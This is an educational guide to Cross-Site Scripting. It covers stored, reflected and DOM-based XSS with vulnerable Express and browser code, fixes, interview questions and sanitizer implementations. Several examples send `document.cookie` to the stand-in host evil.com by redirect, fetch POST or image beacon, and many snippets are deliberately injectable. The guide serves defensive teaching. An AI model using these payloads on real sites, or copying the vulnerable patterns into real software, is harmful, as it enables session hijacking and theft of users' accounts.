# XSS - Cross-Site Scripting, stored/reflected/DOM-based, prevention, sanitization

## Introduction

Cross-Site Scripting (XSS) is one of the most prevalent web security vulnerabilities, consistently ranking in the OWASP Top 10. XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. These scripts execute in the context of the victim's browser, allowing attackers to steal session cookies, redirect users to malicious sites, deface websites, or perform actions on behalf of the victim. XSS exploits the trust a user's browser has in a legitimate website, turning that trust against the user. Understanding XSS is fundamental to building secure JavaScript applications, as it directly impacts how developers handle user input, render content, and interact with the DOM.

## Stored XSS

### What It Is

Stored XSS (also called persistent XSS) occurs when malicious script is permanently stored on the target server, such as in a database, comment field, forum post, or message board. When a victim subsequently requests that stored data, the malicious script is served as part of the legitimate page and executes in their browser. This is the most dangerous form of XSS because the payload persists and affects every user who views the infected content.

### Why It Is Important

Stored XSS is critical because it requires no social engineering to deliver the payload. The attacker simply injects the malicious code once, and every subsequent page view executes the script automatically. This amplifies the attack's reach and impact dramatically. A single stored XSS vulnerability in a widely-used application can compromise thousands of users. Real-world examples include MySpace's Samy worm, which used stored XSS to propagate and became one of the fastest-spreading worms in history.

### How It Works Internally

The attack flow for stored XSS involves three phases. First, the attacker submits malicious input through a form or API endpoint that accepts user-generated content. This input contains JavaScript code embedded within HTML, such as `<script>document.location='https://evil.com/?c='+document.cookie</script>`. Second, the server processes this input without proper sanitization and stores it in its database. Third, when a victim visits the page that renders this stored data, the server retrieves the malicious content from the database and includes it in the HTML response. The browser interprets the injected script as legitimate code from the trusted origin, granting it full access to the page's DOM, cookies, and local storage.

### Syntax

An attacker submits input containing HTML/JavaScript payloads:

```javascript
// Example of malicious input submitted to a comment form
const maliciousPayload = `<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({cookies: document.cookie})
  });
</script>`;
```

On the server side, the vulnerability manifests when user input is rendered without escaping:

```javascript
// Vulnerable server-side rendering (Node.js/Express)
app.get('/comments', (req, res) => {
  const comments = db.getComments(); // Contains attacker's payload
  let html = '<ul>';
  comments.forEach(comment => {
    html += `<li>${comment.text}</li>`; // Direct injection!
  });
  html += '</ul>';
  res.send(html);
});
```

### Beginner Examples

```html
<!-- Vulnerable comment section -->
<form action="/comment" method="POST">
  <textarea name="comment"></textarea>
  <button type="submit">Post Comment</button>
</form>
<div id="comments">
  <!-- If the comment contains <script>alert('XSS')</script>,
       it executes for every visitor -->
</div>
```

```javascript
// Beginner mistake: direct innerHTML assignment
function displayComment(commentText) {
  document.getElementById('comments').innerHTML += commentText;
  // If commentText contains <img src=x onerror=alert(1)>, it executes
}
```

### Intermediate Examples

```javascript
// Intermediate: Understanding where stored XSS hides
// JSON API endpoint returning user-generated HTML
app.get('/api/profile/:id', (req, res) => {
  const profile = db.getProfile(req.params.id);
  // Profile.bio contains user-submitted HTML
  res.json({
    username: profile.username,
    bio: sanitizeHtml(profile.bio) // Must be sanitized
  });
});

// Client-side rendering (still vulnerable if server didn't sanitize)
fetch(`/api/profile/${userId}`)
  .then(res => res.json())
  .then(profile => {
    element.innerHTML = profile.bio; // XSS if not sanitized at source
  });
```

### Advanced Examples

```javascript
// Advanced: DOM-based stored XSS via localStorage
// Malicious script stored in localStorage persists across sessions
const storedData = localStorage.getItem('userPreferences');
if (storedData) {
  const prefs = JSON.parse(storedData);
  // Attacker stores: {"theme": "<img src=x onerror=alert(1)>"}
  document.body.className = prefs.theme; // No XSS (string assignment)
  // But if rendered via innerHTML:
  document.getElementById('theme-display').innerHTML = prefs.theme; // XSS!
}

// Advanced: XSS through rich text editors
// Many WYSIWYG editors allow HTML, creating stored XSS vectors
// Even if you strip <script> tags, event handlers slip through:
// <b onmouseover="alert(1)">Hover me</b>
// <svg onload="alert(1)">
// <link rel="stylesheet" href="javascript:alert(1)">
```

### Real-World Use Cases

- Social media platforms (comment sections, profile bios)
- E-commerce product reviews and Q&A sections
- CMS platforms (WordPress comments, Drupal forums)
- Collaboration tools (wiki pages, document comments)
- Customer support ticketing systems
- Blogging platforms with user-submitted content

### Common Mistakes

- Relying solely on client-side sanitization (attackers can bypass by sending raw HTTP requests)
- Using blacklists to block specific tags or patterns (easily bypassed with encoding)
- Assuming template engines auto-escape all contexts (forgetting URL, CSS, or JavaScript contexts)
- Rendering user content via `innerHTML`, `outerHTML`, `document.write()`, or `insertAdjacentHTML()`
- Storing sanitized data instead of storing raw data and sanitizing at render time

### Best Practices

- Apply context-aware output escaping (HTML entity encoding for HTML context, URL encoding for href/src, JavaScript escaping for script contexts)
- Use Content Security Policy as a defense-in-depth layer
- Validate input on both client and server, but sanitize on output
- Prefer safe DOM methods like `textContent` over `innerHTML`
- Use templating engines with automatic escaping (React's JSX escapes by default, but not for `dangerouslySetInnerHTML`)
- Sanitize with proven libraries like DOMPurify

### Performance Considerations

- Server-side sanitization adds CPU overhead per request; cache sanitized output where possible
- DOMPurify or similar libraries should be used judiciously in performance-critical paths
- Consider sanitizing at write time (when data is stored) vs read time. Read-time sanitization ensures freshest rules but adds latency per request. Write-time sanitization is more performant but may miss new attack vectors
- CSP headers have negligible performance impact and should always be included

### Interview Questions

**Q: What is the difference between stored, reflected, and DOM-based XSS?**
A: Stored XSS persists on the server and affects all visitors. Reflected XSS is embedded in a request (typically URL) and only affects the requesting user. DOM-based XSS occurs entirely client-side when JavaScript writes attacker-controllable data to the DOM without proper sanitization, never reaching the server.

**Q: How would you fix an XSS vulnerability in a legacy application?**
A: First, audit all places where user input is rendered. Implement a centralized output-escaping function. Add CSP headers immediately as a stopgap. Use a tool like DOMPurify for HTML-sanitizing. Prioritize fixing stored XSS first, then reflected, then DOM-based. Use automated scanners to verify fixes.

### Coding Challenges

**Challenge 1:** Given a comment system, identify and fix all XSS vulnerabilities where user comments are rendered.

```javascript
// Vulnerable code
function renderComments(comments) {
  const container = document.getElementById('comments');
  comments.forEach(c => {
    container.innerHTML += `<div class="comment">${c.text}</div>`;
  });
}
```

**Solution:**

```javascript
function renderComments(comments) {
  const container = document.getElementById('comments');
  comments.forEach(c => {
    const div = document.createElement('div');
    div.className = 'comment';
    div.textContent = c.text; // Safe: textContent escapes HTML
    container.appendChild(div);
  });
}

// Alternative: Use DOMPurify for rich content
import DOMPurify from 'dompurify';
function renderRichComments(comments) {
  const container = document.getElementById('comments');
  comments.forEach(c => {
    const div = document.createElement('div');
    div.className = 'comment';
    const sanitized = DOMPurify.sanitize(c.htmlContent);
    div.innerHTML = sanitized;
    container.appendChild(div);
  });
}
```

## Reflected XSS

### What It Is

Reflected XSS occurs when malicious script is embedded in a request (typically the URL query string or form input) and immediately reflected back in the server's response without being stored. The attacker must trick the victim into clicking a crafted link or submitting a specially crafted form. The payload is not persistent; it only affects the user who makes the specific request.

### Why It Is Important

Reflected XSS is the most common XSS variant because it often exists in search functionality, error messages, and form validation feedback. While it requires user interaction (clicking a link), attackers can disguise malicious URLs through URL shorteners, phishing emails, and social media posts. It's a primary vector for credential theft and session hijacking.

### How It Works Internally

The server receives user input, typically from URL parameters via `req.query`, `req.params`, or form fields via `req.body`. Without sanitization, the server embeds this input directly into the HTML response. The browser executes the injected script because it originates from the trusted domain. For example, a search page at `https://example.com/search?q=term` might render the query term on the page: `<p>You searched for: term</p>`. An attacker crafts `https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>`, and the server reflects this verbatim.

### Syntax

```javascript
// Vulnerable Express route
app.get('/search', (req, res) => {
  const query = req.query.q;
  // query is reflected directly into the page
  res.send(`<html>
    <body>
      <p>You searched for: ${query}</p>
    </body>
  </html>`);
});
```

The attacker crafts a URL:

```
https://example.com/search?q=<script>new%20Image().src%3D'https%3A%2F%2Fevil.com%2Flog%3Fc%3D'%2Bdocument.cookie<%2Fscript>
```

### Beginner Examples

```html
<!-- Vulnerable search form -->
<form action="/search" method="GET">
  <input type="text" name="q" value="<%= request.query.q %>">
  <button type="submit">Search</button>
</form>
<!-- If q = "><script>alert('XSS')</script> -->
<!-- input becomes: <input type="text" name="q" value=""><script>alert('XSS')</script>"> -->
```

### Intermediate Examples

```javascript
// Intermediate: Reflected XSS in error handling
app.use((err, req, res, next) => {
  // Error messages that include user input
  if (err.code === 'INVALID_INPUT') {
    res.send(`<div class="error">Invalid input: ${err.userInput}</div>`);
    // XSS if err.userInput contains malicious script
  }
});

// Intermediate: JSONP callback reflection
app.get('/api/data', (req, res) => {
  const callback = req.query.callback;
  const data = { message: 'success' };
  res.send(`${callback}(${JSON.stringify(data)})`);
  // XSS if callback contains: alert(1)//
});
```

### Advanced Examples

```javascript
// Advanced: Reflected XSS through HTTP headers
app.get('/redirect', (req, res) => {
  const referer = req.headers.referer || '/';
  res.send(`<a href="${referer}">Go back</a>`);
  // XSS if Referer header contains " onclick=alert(1)
});

// Advanced: XSS via Content-Type manipulation
// Some browsers perform content sniffing even when Content-Type is set
app.get('/api/echo', (req, res) => {
  res.setHeader('Content-Type', 'application/json');
  // If user input is reflected in JSON without escaping
  res.json({ query: req.query.q });
  // JSON response is safe, but if Content-Type is text/html, it becomes XSS
});

// Advanced: Reflected XSS via upload filename
app.post('/upload', (req, res) => {
  const filename = req.files.file.name;
  res.send(`Uploaded: ${filename}`);
  // Filename: <script>alert(1)</script>.png
});
```

### Real-World Use Cases

- Search engines reflecting search queries
- Login forms reflecting error messages
- Redirect pages that echo the destination URL
- E-commerce sites reflecting product IDs in error states
- PDF generators that include URL parameters in generated documents

### Common Mistakes

- Assuming URL parameters are safe because they're in the URL
- Only escaping double quotes but not single quotes or backticks
- Forgetting to escape in different HTML contexts (within tags, attributes, scripts)
- Reflecting user input in `<script>` blocks or event handlers
- Using `decodeURIComponent` on URL parameters and not re-escaping for HTML

### Best Practices

- Always encode output based on context using libraries like `escape-html` or `he` for Node.js
- For URL parameters displayed in HTML, apply HTML entity encoding
- Use template engines with automatic escaping (EJS, Handlebars, Pug)
- Never reflect user input into `<script>` tags, CSS, or event handler attributes
- Implement Content Security Policy to mitigate impact even if reflection occurs
- Avoid reflecting raw user input in error messages

### Performance Considerations

- URL parameter reflection typically involves small strings, so escaping overhead is negligible
- Pre-compiled templates with auto-escaping have minimal performance impact
- CSP headers should be cached by the browser for subsequent requests
- Server-side escaping per request is more efficient than client-side DOM sanitization

### Interview Questions

**Q: Why is reflected XSS considered less dangerous than stored XSS?**
A: Reflected XSS requires user interaction (clicking a crafted link) and is non-persistent, meaning it affects only the user who clicks the specific link. Stored XSS is self-propagating and affects all users who view the infected page without requiring any action beyond normal browsing.

**Q: How can URL encoding complicate XSS detection?**
A: Attackers can double-encode payloads, use Unicode variants, or split script across multiple parameters to evade signature-based detection. For example, `%253Cscript%253E` (double-encoded `<`) bypasses single-decode checks but is decoded twice by the server or browser.

### Coding Challenges

**Challenge 1:** Fix the reflected XSS in this search endpoint.

```javascript
app.get('/search', (req, res) => {
  const q = req.query.q;
  res.render('search', { query: q });
});
```

**Solution:**

```javascript
const he = require('he');
// Or use the template engine's built-in escaping
app.get('/search', (req, res) => {
  const q = req.query.q;
  res.render('search', { query: he.encode(q) });
  // In the template: <%= query %> (EJS auto-escapes)
});
```

## DOM-based XSS

### What It Is

DOM-based XSS is a client-side vulnerability where the attack payload is never sent to the server. Instead, the malicious script executes entirely in the browser by modifying the DOM environment. The source of the untrusted data is typically the URL fragment (`#hash`), `window.name`, `document.referrer`, `localStorage`, or `sessionStorage`. The vulnerability lies in client-side JavaScript code that reads from these sources and passes the data to dangerous sinks like `innerHTML`, `document.write()`, or `eval()`.

### Why It Is Important

DOM-based XSS is notoriously difficult to detect because traditional server-side security scanners cannot identify it—the payload never reaches the server. It bypasses server-side sanitization entirely. As single-page applications (SPAs) and client-side rendering become dominant, DOM-based XSS is increasingly prevalent. It requires a different security mindset focused on client-side data flow analysis.

### How It Works Internally

The attack works in three steps. First, the attacker crafts a URL or manipulates a client-side storage mechanism. Second, the victim's browser loads a legitimate page from the trusted server (no malicious content is sent to or from the server). Third, the page's JavaScript reads the malicious data from the DOM source (e.g., `location.hash`, `location.search`) and writes it to a DOM sink without validation. The key difference from server-side XSS is that the server response is completely benign—the attack manifests during client-side processing.

```javascript
// DOM source: URL fragment
const hash = location.hash.substring(1); // Gets content after #
// DOM sink: innerHTML
document.getElementById('output').innerHTML = hash;
// URL: https://example.com/page#<img src=x onerror=alert(1)>
```

### Syntax

```javascript
// Common DOM XSS patterns
// Source: URL parameters
const params = new URLSearchParams(window.location.search);
const name = params.get('name');

// Sink: innerHTML
document.getElementById('greeting').innerHTML = name;

// Source: URL hash
const section = window.location.hash.slice(1);
document.querySelector(section).style.display = 'block'; // XSS if selector contains malicious content

// Source: window.name (persists across navigations)
const data = window.name;
document.write(data);

// Source: postMessage
window.addEventListener('message', (e) => {
  document.getElementById('display').innerHTML = e.data; // XSS!
});
```

### Beginner Examples

```html
<!-- Vulnerable page: dom-xss.html -->
<!DOCTYPE html>
<html>
<body>
  <div id="output"></div>
  <script>
    // Reads the URL hash and writes to DOM
    const message = window.location.hash.substring(1);
    document.getElementById('output').innerHTML = message;
  </script>
</body>
</html>
<!-- URL: dom-xss.html#<img src=x onerror=alert('DOM-XSS')> -->
```

### Intermediate Examples

```javascript
// Intermediate: DOM XSS via history.pushState
// SPA routers that read state from the URL
window.addEventListener('popstate', (event) => {
  const view = event.state?.view || 'home';
  // Directly using view to load a template
  loadView(view);
});

function loadView(viewName) {
  // If viewName is user-controlled from URL and not validated
  fetch(`/templates/${viewName}.html`)
    .then(r => r.text())
    .then(html => {
      document.getElementById('app').innerHTML = html;
    });
}
// URL: /app?view=../../profile%3Cscript%3E...
```

### Advanced Examples

```javascript
// Advanced: DOM XSS via structured clone sinks
// Sinks beyond innerHTML that are dangerous
function updateElement() {
  const params = new URLSearchParams(location.search);
  
  // Sink: eval (obvious)
  eval(params.get('code'));
  
  // Sink: setTimeout string argument
  setTimeout(params.get('code'), 100);
  
  // Sink: script element creation
  const script = document.createElement('script');
  script.src = params.get('src'); // Attacker provides malicious JS URL
  document.body.appendChild(script);
  
  // Sink: SVG namespace manipulation
  const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  svg.innerHTML = params.get('svg'); // SVG innerHTML allows script execution
}

// Advanced: DOM clobbering
// Creating elements with id attributes that shadow global variables
// <a id="sanitize" href="javascript:alert(1)">click</a>
// When sanitize is a global reference to a function, this clobbers it
```

### Real-World Use Cases

- Single-page applications with hash-based routing
- Client-side template rendering frameworks (Angular, Vue, React without proper escaping)
- Browser extensions that read from `storage.local`
- Analytics scripts that read `document.referrer` for tracking
- Chat applications using WebSocket messages that are directly rendered

### Common Mistakes

- Thinking that because data comes from the client (same origin), it's safe
- Using `innerHTML` instead of `textContent` for text content
- Using `location.hash` or `location.search` without validation
- Receiving `postMessage` data and rendering it without origin checking
- Relying on URL encoding as a security measure

### Best Practices

- Always use `textContent` instead of `innerHTML` when inserting text
- Use `setAttribute()` instead of assigning to HTML attribute properties
- For HTML content, use DOMPurify on the client side
- Validate URL fragments and search parameters against a whitelist
- Always check `event.origin` in `message` event handlers
- Use `sandbox` attribute on iframes that receive untrusted data
- Prefer safe APIs: `createElement`, `appendChild`, `textContent`

### Performance Considerations

- Client-side sanitization (DOMPurify) adds processing time on page load
- For frequently updated DOM content, cache sanitized results
- Using `textContent` is faster than `innerHTML` because it avoids HTML parsing
- Safe DOM APIs are consistently faster than innerHTML with sanitization
- CSP adds overhead for inline script hashes but negligible for most pages

### Interview Questions

**Q: How does DOM-based XSS differ from reflected XSS?**
A: In reflected XSS, the server includes the malicious payload in the HTTP response. In DOM-based XSS, the server response is clean; the vulnerability exists purely in client-side JavaScript that reads attacker-controllable data from DOM sources and writes to dangerous sinks.

**Q: What are common DOM sources and sinks?**
A: Sources: `location.hash`, `location.search`, `location.pathname`, `document.URL`, `document.documentURI`, `document.referrer`, `window.name`, `postMessage` data, `localStorage`, `sessionStorage`, `IndexedDB`, `cookies`. Sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `Function()`, `script.src`, `onload`/`onerror` handlers.

### Coding Challenges

**Challenge 1:** Identify and fix the DOM XSS vulnerability.

```javascript
function updateProfile() {
  const params = new URLSearchParams(location.search);
  const name = params.get('name');
  const bio = params.get('bio');
  
  document.getElementById('name').innerHTML = name;
  document.getElementById('bio').textContent = bio;
}
```

**Solution:**

```javascript
function updateProfile() {
  const params = new URLSearchParams(location.search);
  const name = params.get('name');
  const bio = params.get('bio');
  
  // Fix: Use textContent for name too
  document.getElementById('name').textContent = name;
  document.getElementById('bio').textContent = bio;
  
  // Alternatively, validate against whitelist
  const validNames = ['alice', 'bob', 'charlie'];
  if (!validNames.includes(name)) {
    document.getElementById('name').textContent = 'Unknown';
    return;
  }
  document.getElementById('name').textContent = name;
}
```

## Prevention and Sanitization

### What It Is

XSS prevention encompasses a set of practices, libraries, and browser mechanisms designed to eliminate or mitigate script injection vulnerabilities. Sanitization is the process of cleaning untrusted input to remove or neutralize malicious content while preserving legitimate content. Prevention strategies operate at multiple layers: input validation, output encoding, content security policies, and safe API usage.

### Why It Is Important

Defense-in-depth is essential because no single protection is foolproof. Input validation can have bypasses. Output encoding might miss contexts. CSP might not cover all vectors. Layered prevention ensures that if one mechanism fails, others still provide protection. Sanitization, when done correctly, allows applications to accept rich user content (like formatted comments) while neutralizing threats.

### How It Works Internally

HTML sanitization works by parsing untrusted HTML into a DOM tree, filtering out dangerous elements and attributes, and serializing the safe result. DOMPurify, for example, creates an isolated DOM context, iterates through all nodes, removes blacklisted elements (script, style, object, embed, etc.), removes event handler attributes (onclick, onload, onerror, etc.), and checks for dangerous URL schemes (javascript:, data:, vbscript:). The result is a subset of HTML that is safe to render.

### Syntax

```javascript
// DOMPurify usage
import DOMPurify from 'dompurify';

const unsafeInput = '<img src=x onerror=alert(1)><p>Safe text</p>';
const clean = DOMPurify.sanitize(unsafeInput);
// Result: <p>Safe text</p>

// Server-side sanitization with sanitize-html
const sanitizeHtml = require('sanitize-html');
const clean2 = sanitizeHtml(unsafeInput, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  allowedAttributes: { 'a': ['href'] },
  allowedSchemes: ['http', 'https', 'mailto']
});
```

### Beginner Examples

```javascript
// Context-aware output encoding
const he = require('he');

// For HTML body context
const userInput = '<script>alert(1)</script>';
const encoded = he.encode(userInput, { useNamedReferences: true });
// &lt;script&gt;alert(1)&lt;/script&gt;

// For HTML attribute context
const url = 'javascript:alert(1)';
// Always validate URLs against a whitelist
function safeUrl(input) {
  const allowedSchemes = ['http', 'https', 'mailto'];
  try {
    const parsed = new URL(input);
    return allowedSchemes.includes(parsed.protocol.slice(0, -1));
  } catch { return false; }
}
```

### Intermediate Examples

```javascript
// Comprehensive sanitization pipeline
function sanitizeUserContent(input, context = 'html') {
  // Step 1: Normalize input
  let sanitized = input.trim();
  
  // Step 2: Apply context-specific sanitization
  switch (context) {
    case 'html':
      sanitized = DOMPurify.sanitize(sanitized, {
        ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
        ALLOWED_ATTR: ['href', 'class'],
        ALLOW_DATA_ATTR: false,
        ADD_ATTR: ['target']
      });
      break;
    case 'url':
      sanitized = encodeURI(sanitized);
      break;
    case 'javascript':
      sanitized = JSON.stringify(sanitized).slice(1, -1);
      break;
    case 'css':
      sanitized = sanitized.replace(/[^a-zA-Z0-9\s-#]/g, '');
      break;
  }
  
  return sanitized;
}
```

### Advanced Examples

```javascript
// Advanced: Building a custom sanitizer for a specific use case
class RichTextSanitizer {
  constructor() {
    this.allowedTags = new Set([
      'p', 'br', 'b', 'i', 'u', 's', 'em', 'strong',
      'a', 'img', 'ul', 'ol', 'li', 'blockquote',
      'pre', 'code', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'
    ]);
    
    this.allowedAttributes = {
      'a': ['href', 'title', 'rel'],
      'img': ['src', 'alt', 'title', 'width', 'height'],
      '*': ['class']
    };
    
    this.allowedSchemes = ['http', 'https', 'mailto', 'ftp'];
    this.allowedProtocols = ['http:', 'https:', 'mailto:', 'ftp:'];
  }
  
  sanitizeHtml(html) {
    const doc = new DOMParser().parseFromString(html, 'text/html');
    return this._sanitizeNode(doc.body).innerHTML;
  }
  
  _sanitizeNode(node) {
    const result = node.cloneNode(false);
    
    if (node.nodeType === Node.TEXT_NODE) {
      return node;
    }
    
    if (node.nodeType === Node.ELEMENT_NODE) {
      const tagName = node.tagName.toLowerCase();
      
      if (!this.allowedTags.has(tagName)) {
        // Return text content only for disallowed elements
        return document.createTextNode(node.textContent);
      }
      
      // Filter attributes
      const allowedAttrs = this.allowedAttributes[tagName] || this.allowedAttributes['*'] || [];
      for (const attr of Array.from(result.attributes)) {
        if (!allowedAttrs.includes(attr.name)) {
          result.removeAttribute(attr.name);
        }
        
        // Validate URLs
        if (attr.name === 'href' || attr.name === 'src') {
          try {
            const url = new URL(attr.value, document.baseURI);
            if (!this.allowedProtocols.includes(url.protocol)) {
              result.removeAttribute(attr.name);
            }
          } catch {
            result.removeAttribute(attr.name);
          }
        }
      }
      
      // Recursively sanitize children
      for (const child of Array.from(node.childNodes)) {
        result.appendChild(this._sanitizeNode(child));
      }
      
      return result;
    }
    
    return document.createTextNode('');
  }
}

// Advanced: CSP as sanitization backup
// Server response header
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123';
// This prevents inline scripts from executing unless they have the correct nonce
```

### Real-World Use Cases

- User comment systems with rich text formatting
- WYSIWYG editors like TinyMCE, Quill, or Draft.js
- Email clients rendering HTML emails
- Documentation systems accepting Markdown with HTML
- Chat applications with message formatting

### Common Mistakes

- Using regex to sanitize HTML (HTML cannot be reliably parsed with regex)
- Double-encoding: applying encoding twice, producing garbled output
- Forgetting to sanitize in different contexts (CSS, URL, JavaScript)
- Only sanitizing on the client side (server must also sanitize)
- Using `strip_tags()` style functions that leave attribute-based vectors
- Sanitizing input for storage vs output (store raw, sanitize at render)

### Best Practices

- Use well-maintained sanitization libraries (DOMPurify, sanitize-html, OWASP Java Encoder for Java)
- Apply context-aware output encoding (HTML entity, URL encoding, JavaScript unicode escapes)
- Implement Content Security Policy with strict directives
- Use `trusted-types` CSP directive to lock down DOM XSS sinks
- Store raw input, sanitize at output time
- Validate input on input, encode on output
- Keep sanitization libraries up to date
- Use nonce-based or hash-based CSP for inline scripts

### Performance Considerations

- Sanitization libraries add 0.1-5ms per operation depending on input size
- Cache sanitized output for frequently accessed content
- Consider pre-sanitizing at write time for high-read/low-write applications
- CSP evaluation is done by the browser and has minimal overhead
- DOMPurify is highly optimized, processing ~100KB of HTML in under 10ms
- Server-side sanitization uses CPU; evaluate if it becomes a bottleneck

### Interview Questions

**Q: Why can't HTML be sanitized with regex?**
A: HTML is a context-free language, not regular. Regex cannot correctly parse nested tags, attribute values with special characters, or handle the complex escaping rules of HTML. Attackers exploit regex limitations with malformed HTML that browsers interpret differently. The famous Zalgo text and similar techniques break naive regex patterns.

**Q: Explain the difference between sanitization and validation.**
A: Validation rejects input that doesn't meet criteria (e.g., email format). Sanitization cleans input by removing dangerous parts while preserving safe content. Validation happens on input; sanitization typically happens on output. Validation is for data integrity; sanitization is for security.

### Coding Challenges

**Challenge 1:** Implement a secure HTML sanitizer that allows only `<b>`, `<i>`, and `<a>` tags with href attributes.

```javascript
function safeHtml(input) {
  // Your implementation here
}
```

**Solution:**

```javascript
function safeHtml(input) {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'a'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_SCHEMES: ['http', 'https', 'mailto']
  });
}

// Or custom implementation
function safeHtml(input) {
  const doc = new DOMParser().parseFromString(input, 'text/html');
  const result = [];
  
  function walk(node) {
    if (node.nodeType === 3) { // Text
      result.push(node.textContent);
    } else if (node.nodeType === 1) { // Element
      const tag = node.tagName.toLowerCase();
      if (['b', 'i', 'a'].includes(tag)) {
        result.push(`<${tag}`);
        if (tag === 'a' && node.getAttribute('href')) {
          const href = node.getAttribute('href');
          if (href.startsWith('http://') || href.startsWith('https://') || href.startsWith('mailto:')) {
            result.push(` href="${he.encode(href)}"`);
          }
        }
        result.push('>');
        for (const child of node.childNodes) walk(child);
        result.push(`</${tag}>`);
      } else {
        for (const child of node.childNodes) walk(child);
      }
    }
  }
  
  walk(doc.body);
  return result.join('');
}
```

### Related Topics

- Content Security Policy (CSP) - defense-in-depth header
- HTML5 sandbox attribute for iframes
- Trusted Types API for DOM sink protection
- Subresource Integrity (SRI) for CDN-loaded scripts
- OWASP XSS Filter Evasion Cheat Sheet
- HTTPOnly cookies to prevent cookie theft via XSS
- Secure and SameSite cookie attributes
- Input validation and output encoding (covered in Secure Coding)
- CSP (covered in Content Security Policy)
